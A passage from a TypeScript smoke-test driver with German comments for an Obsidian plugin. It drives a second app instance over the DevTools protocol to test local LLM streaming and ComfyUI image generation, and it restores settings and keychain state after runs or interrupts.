  const name = "M4 Deutung streamt gegen den echten Endpunkt";
  const url = "http://127.0.0.1:1234";
  const modell = await geladenesModell(url);
  if (modell === null) { unmeasured(name, `auf ${url} ist kein Modell geladen oder der Server antwortet nicht (ein Lauf loeste sonst ein JIT-Laden aus)`); return; }
  const vorher = await cdp.evaluate<{ eps: unknown; choice: unknown; thinking: unknown }>(`
    const l = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.llm;
    const r = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.request;
    return { eps: l.endpoints, choice: l.choice ?? null, thinking: r.thinking.creative ?? null };`);
  try {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      p.settings.llm.endpoints = [{ url: ${JSON.stringify(url)}, model: ${JSON.stringify(modell)} }];
      p.settings.llm.choice = {}; p.settings.request.thinking.creative = "off";
      p.llm.invalidate(); await p.saveSettings();
      return true;`);
    // Ein echtes 7B-Modell schreibt ~35 Zeichen/s: eine volle Deutung (~3800 Zeichen) braucht 110–160 s (gemessen 2026-10-09).
    // Mit 150 s Frist war M4 an einem langsamen Lauf rot, ohne dass etwas kaputt war.
    // Umgeschrieben (Welle 15): vorher wartete M4 auf die FERTIGE Deutung. Ein 7B-Coder-Modell ohne
    // Token-Grenze schrieb am 2026-10-09 in 3 von 7 Laeufen ueber 10 000 Zeichen weiter und liess M4 rot
    // werden, obwohl der Stream lief. Belegt wird jetzt: der Stream liefert Text (>= 400 Zeichen), dann Abbruch.
    const t0 = Date.now();
    const ok = await laufeDeutung(cdp, 240_000, "Smoke M: Endpunkt-Manager", 400);
    const dauer = Math.round((Date.now() - t0) / 1000);
    const laenge = letzteDeutungLaenge;
    record(name, ok && laenge >= 400, ok ? `${laenge} Zeichen Deutung von ${modell} nach ${dauer} s (Stream, danach abgebrochen oder beendet)` : "Deutungslauf lieferte kein Ergebnis");
  } finally {
    await cdp.evaluate(`
      const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
      const v = ${JSON.stringify(vorher)};
      p.settings.llm.endpoints = v.eps;
      if (v.thinking === null) delete p.settings.request.thinking.creative; else p.settings.request.thinking.creative = v.thinking;
      if (v.choice === null) delete p.settings.llm.choice; else p.settings.llm.choice = v.choice;
      p.llm.invalidate(); await p.saveSettings();
      return true;`).catch(() => null);
  }
}

/** Zaehlt Treffer eines Selektors in der Settings-Oberflaeche — Analog zu `zeilenZahl`, aber
 *  mit eigenem Selektor statt `.setting-item` (fuer den lokalen-Editor-Marker). */
async function zeilenZahlSelector(ui: SettingsUi, selector: string): Promise<number> {
  return ui.cdp.evaluate<number>(`
    const wurzel = ${wurzelAusdruck(ui)};
    return wurzel ? wurzel.querySelectorAll(${JSON.stringify(selector)}).length : -1;
  `);
}

// ─── Hauptlauf ─────────────────────────────────────────────────────────────────────

/** D1-D5 (Bildlauf) und E1-E3 (Speichern): haengen beide an der Bildgenerierung. */
const BILD_NAMEN = PUNKTE.filter((n) => /^[DE]\d/.test(n));

async function main(): Promise<void> {
  const args = parseArgs(process.argv.slice(2));
  const portRoh = args.value("--port");
  const port = Number(portRoh);
  if (portRoh === undefined || !Number.isInteger(port) || port < 1024 || port > 65535) {
    throw new Error(`--port <Zahl> fehlt oder ist ungueltig (${JSON.stringify(portRoh)}). Den Port der eigenen Zweitinstanz angeben (Rezept im Dateikopf, z. B. 9400).`);
  }
  const vault = args.value("--vault") ?? PLUGIN_ID;
  const endpoint = args.value("--endpoint") ?? "http://127.0.0.1:8000";
  const keinBild = args.has("--kein-bild");

  // Die Fixture ist dieselbe, die auch die Unit-Tests fuettert — ein zweiter Workflow
  // waere ein zweiter Wahrheitsbegriff.
  //
  // Ueber `process.cwd()`, nicht ueber `import.meta.url`: esbuild legt das Bundle als
  // `.gui-smoke.mjs` im Paket-Root ab, nicht in `scripts/` — ein Pfad relativ zum Modul
  // zeigt daher eine Ebene zu hoch und traf beim ersten Lauf ins Dach-Verzeichnis.
  // `npm run` fuehrt immer im Paket-Root aus.
  const workflowFixture = await import("node:fs/promises").then((fs) =>
    fs.readFile(`${process.cwd()}/tests/fixtures/comfy-sdxl.json`, "utf8"),
  );

  // `attachTo` waehlt das Fenster mit `app.workspace.rootSplit.doc === document` — `Cdp.attach` nahm das erste
  // Fenster mit passendem Titel und war bei einem Pop-out mit gleichem Titel mehrdeutig.
  const cdp = await attachTo("workspace", port, vault);
  if (!cdp) throw new Error(`Kein Obsidian-Fenster fuer Vault „${vault}“ auf Port ${port} — laeuft die Zweitinstanz (Rezept im Dateikopf)?`);
  const protokoll: string[] = [];
  await cdp.mitschnitt((zeile) => {
    if (/yijing/i.test(zeile)) protokoll.push(zeile);
  });

  // Chromium drosselt Hintergrundfenster — ohne ein sichtbares Fenster misst man ein Phantom. `requireVisible` holt das Fenster
  // dieser Verbindung nach vorn (nicht per `osascript activate`: das trifft die reguläre Instanz statt der Zweitinstanz, gemessen
  // von kl-w19) und bricht mit Meldung ab, wenn es unsichtbar bleibt.
  await cdp.send("Page.enable");
  try {
    await requireVisible(cdp);
  } catch (e) {
    cdp.close();
    throw new Error(e instanceof Error ? e.message : String(e));
  }

  // Ein frischer Staging-Vault startet im Restricted Mode, ein frisches Profil fragt „Dem Ersteller vertrauen“:
  // `bereiteInstanzVor` bestaetigt den Dialog und schaltet frei — nur im eigenen Staging-Vault (`nurVault`,
  // heisst wie das Repo); in einem fremden Vault bleibt es beim Pruefpunkt A1 mit Ansage. `manifest.id` = Repo-Name.
  if (!(await cdp.evaluate<boolean>(`return Boolean(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]);`))) {
    const r = await bereiteInstanzVor(cdp, { pluginIds: [PLUGIN_ID], nurVault: PLUGIN_ID, sprache: "en" });
    instanzHinweis = r.hinweis;
    console.log(`Instanz vorbereitet: ${r.hinweis}`);
  }

  // Herkunfts-Guard: laeuft dieser Smoke ueberhaupt gegen UNSEREN Build? Der Pfad kommt aus
  // der LAUFENDEN Instanz, nicht aus stagingVaultDir(REPO_NAME) — ein Treiber dockt per
  // --vault an ein beliebiges Fenster an, und ein aus der Konvention abgeleiteter Pfad pruefte
  // im Zweifel eine Datei, die mit dem Lauf nichts zu tun hat (Lesson 2026-09-02,
  // kuro-gamification). `manifest.version` taugt dafuer nicht: Store- und Repo-Build tragen
  // dieselbe Nummer.
  //
  // Die Warnung wird hier NUR gemerkt und unter der Bilanz nochmal ausgegeben — ein
  // console.warn am Anfang eines mehrminuetigen Laufs ist beim Ablesen des Ergebnisses
  // weggescrollt, und dann steht wieder ein sauber aussehendes "N/M gruen" da, das fuer den
  // Repo-Stand nichts belegt (der Zustand vom 2026-08-30, 69 von 150 Punkten).
  // Deklaration VOR dem try, sonst ist sie im finally nicht mehr sichtbar.
  let herkunftsWarnung: string | null = null;

  // Vorwert VOR dem try lesen: nur so ist er auch nach einem Abbruch im finally da.
  const originalData = await readVaultFile(cdp, DATA_PATH);
  if (originalData !== null) await writeVaultFile(cdp, DATA_RESCUE, originalData);
  // Auch der Schluesselbund-Eintrag ist Zustand des Wirts: B8 und F8 schreiben ihn, und die
  // data.json-Ruecksicherung allein liesse den Smoke-Schluessel dort stehen — beim naechsten
  // Laden GEWAENNE er gegen data.json (Schluesselbund hat Vorrang).
  let originalBund = await schluesselbund(cdp);
  const aufraeumen: string[] = [];

  // Ein SIGINT mitten im Lauf ueberspringt das `finally` unten NICHT im try/catch-Sinn,
  // sondern beendet den Node-Prozess sofort. Vier Zustandssorten ueberleben das sonst:
  //  · data.json (Migrations-/Testschreibvorgaenge in mehreren Abschnitten).
  //  · der Schluesselbund-Eintrag (B8/F8 schreiben ihn real).
  //  · Testdateien in `aufraeumen` (per Referenz von main() aus befuellt, `abschnittSpeichern`
  //    mutiert dasselbe Array).
  //  · der gestubbte llm-endpoint-manager-Slot aus `pruefeManager` — als
  //    `window.__smokeVorherManager` im RENDERER gesichert (nicht als Node-Closure), genau wie
  //    bei neurovim-obsidian/slide-deck: nur so erreicht ihn ein Handler auf main()-Ebene,
  //    unabhaengig davon, welcher Abschnitt gerade laeuft. `p.settings.llm.endpoints`
  //    (pruefeManager()s eigener `vorherEndpoints`) ist Teil DERSELBEN data.json und damit
  //    durch den vollstaendigen Datei-Restore unten mitabgedeckt — kein separater Pfad noetig.
  //
  // Bekannte Falle (Master-Review an vault-crews, ctrlc-w7b): der try-Zweig kann NACH dem
  // ersten Restore noch weiterlaufen, bis der Event-Loop das Signal zustellt, und erneut in
  // data.json schreiben. Deshalb NACH dem Reload ein zweites Mal gegen `originalData`
  // pruefen und im Zweifel ERNEUT schreiben — die Rettungsdatei im Vault bleibt liegen, bis
  // der Endzustand passt.
  let signalCleanupRunning = false;
  const onAbortSignal = (signal: NodeJS.Signals): void => {
    if (signalCleanupRunning) return;
    signalCleanupRunning = true;
    void (async () => {
      console.log(`\n\nAbbruch durch ${signal} — raeume Vault-Zustand auf...`);
      if (originalBund) {
        await schluesselbundZuruecksetzen(cdp, originalBund).catch(() => undefined);
      }
      await removeFakeManager(cdp).catch(() => undefined);
      for (const pfad of aufraeumen) {
        await cdp.evaluate(`
          const f = app.vault.getAbstractFileByPath(${JSON.stringify(pfad)});
          if (f) await app.fileManager.trashFile(f);
          return true;
        `).catch(() => undefined);
      }
      if (originalData !== null) {
        await writeVaultFile(cdp, DATA_PATH, originalData).catch(() => undefined);
        await reloadPlugin(cdp).catch(() => undefined);
        // Zweiter Vergleich NACH dem Reload — derselbe Fund wie bei vault-crews: der
        // try-Zweig kann in diesem Zeitfenster erneut geschrieben haben.
        const nochmal = await readVaultFile(cdp, DATA_PATH).catch(() => null);
        if (nochmal !== originalData) {
          await writeVaultFile(cdp, DATA_PATH, originalData).catch(() => undefined);
          console.log("  data.json erneut zurueckgeschrieben (try lief nach dem Signal weiter)");
        }
        const endstand = await readVaultFile(cdp, DATA_PATH).catch(() => null);
        if (endstand === originalData) {
          await removeVaultFile(cdp, DATA_RESCUE).catch(() => undefined);
        } else {
          console.log(`  ! data.json weicht weiter ab — Rettungsdatei bleibt liegen: ${DATA_RESCUE}`);
        }
      }
      cdp.close();
      process.exit(130);
    })();
  };
  process.on("SIGINT", onAbortSignal);
  process.on("SIGTERM", onAbortSignal);

  try {
    // Der Guard steht FRUEH IM try — beide Haelften sind noetig und ziehen in
    // verschiedene Richtungen:
    //   im try, damit das finally laeuft. Dort haengt `cdp.close()`; ein Guard, der davor
    //     wirft, laesst den CDP-Socket offen. Das ist die Ursache des "haengenden Treibers"
    //     aus der Dach-Messung vom 2026-08-30, die faelschlich als "zu viele Fenster"
    //     gelesen wurde. (Dieser Treiber hatte den Fehler: bis 2026-09-02 stand der Aufruf
    //     VOR dem try — gemeldet von vault-rag, nachgemessen, hier behoben.)
    //   frueh, damit das finally NICHTS ZU TUN hat: `aufraeumen` ist noch leer, und
    //     `originalData` wird unveraendert zurueckgeschrieben. Wer den Guard spaeter
    //     platziert, verliert diese Haelfte.
    const vaultInfo = await cdp.evaluate<{ basePath: string; configDir: string }>(`
      return { basePath: app.vault.adapter.basePath, configDir: app.vault.configDir };
    `);
    requireEigenerBuild(
      join(vaultInfo.basePath, vaultInfo.configDir, "plugins", PLUGIN_ID, "main.js"),
      join(process.cwd(), "main.js"),   // frisch gebaut, sonst sagt der Vergleich nichts
      (meldung) => { herkunftsWarnung = meldung; console.warn(meldung); },
    );

    await abschnittPanel(cdp);

    // B-1 — ein liegen gebliebener Smoke-Schluessel aus einem VOR diesem Handler
    // abgebrochenen Vorlauf (SIGKILL/Absturz) waere sonst still gefaehrlich: B6/B8 lesen
    // `originalBund.wert` als "echten Vorbestand" und schreiben ihn am Ende treu zurueck —
    // der Testschluessel wuerde sich damit selbst verewigen, UND B6/B8 maessen faelschlich
    // gegen den eigenen Rest statt gegen einen frischen Ausgangszustand (Master-Fund,
    // ctrlc-w7b 14:37: die vermeintlich "vorbestehenden" Rot B6/B8 WAREN genau dieser Fall).
    // Marker: alle Testwerte dieses Treibers tragen das Praefix "smoke-".
    const kaputterBund = Object.values(originalBund ?? {}).some((w) => w.startsWith("smoke-"));
    record(
      "B-1 Kein liegen gebliebener Smoke-Schluessel im Schluesselbund aus einem abgebrochenen Vorlauf",
      !kaputterBund,
      kaputterBund
        ? `Schluesselbund trug noch ${JSON.stringify(Object.entries(originalBund ?? {}).filter(([, w]) => w.startsWith("smoke-")))} — entfernt`
        : "Ausgangszustand unauffaellig",
    );
    if (kaputterBund) {
      originalBund = Object.fromEntries(Object.entries(originalBund ?? {}).filter(([, w]) => !w.startsWith("smoke-")));
      await schluesselbundZuruecksetzen(cdp, originalBund);
    }

    await abschnittMigration(cdp);
    await abschnittSettings(cdp, port, workflowFixture);
    await abschnittDeklarativ(cdp, port);
    if (args.has("--kein-manager")) {
      for (const n of PUNKTE.filter((x) => /^M[123]/.test(x))) skipped(n, "--kein-manager gesetzt");
    } else {
      await pruefeManager(cdp, port);
      await pruefeTabWechsel(cdp, port);
    }
    await pruefeAnfrage(cdp, port);
    await pruefeSchutz(cdp, aufraeumen);
    await pruefeEchtenEndpunkt(cdp);

    if (keinBild) {
      for (const n of BILD_NAMEN) skipped(n, "--kein-bild gesetzt (Bildlauf und Speichern abgewaehlt)");
    } else {
      const erreichbar = await fetch(`${endpoint.replace(/\/+$/, "")}/system_stats`)
        .then((r) => r.ok)
        .catch(() => false);
      if (!erreichbar) {
        for (const n of BILD_NAMEN) unmeasured(n, `ComfyUI unter ${endpoint} nicht erreichbar`);
      } else {
        await abschnittBild(cdp, endpoint, workflowFixture);
        await abschnittSpeichern(cdp, aufraeumen);
      }
    }
  } finally {
    console.log("\n── Aufraeumen ──");
    for (const pfad of aufraeumen) {
      await cdp.evaluate(`
        const f = app.vault.getAbstractFileByPath(${JSON.stringify(pfad)});
        if (f) await app.fileManager.trashFile(f);
        return true;
      `);
      console.log(`  Papierkorb: ${pfad}`);
    }
    if (originalBund) {
      await schluesselbundZuruecksetzen(cdp, originalBund);
      console.log(`  Schluesselbund zurueckgesetzt: ${Object.keys(originalBund).length} Vorwert(e) geschrieben, Neues entfernt`);
    }
    if (originalData !== null) {
      await writeVaultFile(cdp, DATA_PATH, originalData);
      await removeVaultFile(cdp, DATA_RESCUE);
      await reloadPlugin(cdp);
      const wieder = await readVaultFile(cdp, DATA_PATH);
      // Trug die Wirts-data.json noch einen Klartext-Schluessel, migriert ihn der Reload in
      // den Schluesselbund und schreibt data.json neu — das ist die Sache selbst, keine
      // Abweichung. Erkannt daran, dass nur `llm.apiKey` geleert wurde.
      // Trug die Wirts-data.json noch die alte Form (`llm.apiKey`, Endpunkte als Text), migriert der
      // Reload sie und schreibt data.json neu — das ist die Sache selbst, keine Abweichung.
      const migriert = wieder !== originalData && (() => {
        try {
          const a = JSON.parse(originalData) as { llm?: { apiKey?: string; endpoints?: unknown } };
          const b = JSON.parse(wieder ?? "{}") as { llm?: { apiKey?: string; endpoints?: unknown } };
          const alteForm = a.llm?.apiKey !== undefined || typeof a.llm?.endpoints === "string"
            || (Array.isArray(a.llm?.endpoints) && a.llm.endpoints.some((e) => typeof e === "string"));
          return alteForm && b.llm?.apiKey === undefined;
        } catch { return false; }
      })();
      console.log(`  data.json zurueckgeschrieben: ${wieder === originalData ? "byte-gleich" : migriert ? "alte Form des Wirts (Textliste, llm.apiKey) migriert (erwartet)" : "ABWEICHUNG — pruefen!"}`);
    }
    await closeSettings(cdp, null);

    if (protokoll.length) {
      console.log("\n── Renderer-Meldungen (gefiltert auf yijing) ──");
      for (const z of protokoll.slice(0, 20)) console.log(`  ${z}`);
    }

    // Die Abschlusszeile traegt alle vier Zustaende: ein uebersprungener oder nie gemessener Punkt gehoert IN sie,
    // sonst wird aus „60 gruen“ beim Zitieren ein vollstaendiger Lauf. `abschluss()` setzt Exit 1 bei Rot ODER
    // nichts gemessen; ein Abbruch vor der ersten Messung zaehlt dabei alle Punkte als „nichts gemessen“.
    bilanz.abschluss();
    for (const p of bilanz.eintraege()) {
      if (p.zustand === "rot" || p.zustand === "nichts-gemessen") console.log(`  ${p.name} — ${p.detail}`);
    }
    if (herkunftsWarnung) {
      console.log(`\n⚠️  Diese Bilanz ist NICHT fuer den Repo-Stand belegt: ${herkunftsWarnung}`);
    }
    cdp.close();
    // Abmelden, sonst haengt ein SPAETES Signal (nach normalem Abschluss, cdp schon zu) den
    // Prozess in onAbortSignal an einer toten Verbindung auf.
    process.off("SIGINT", onAbortSignal);
    process.off("SIGTERM", onAbortSignal);
  }
}

runDriver(main);
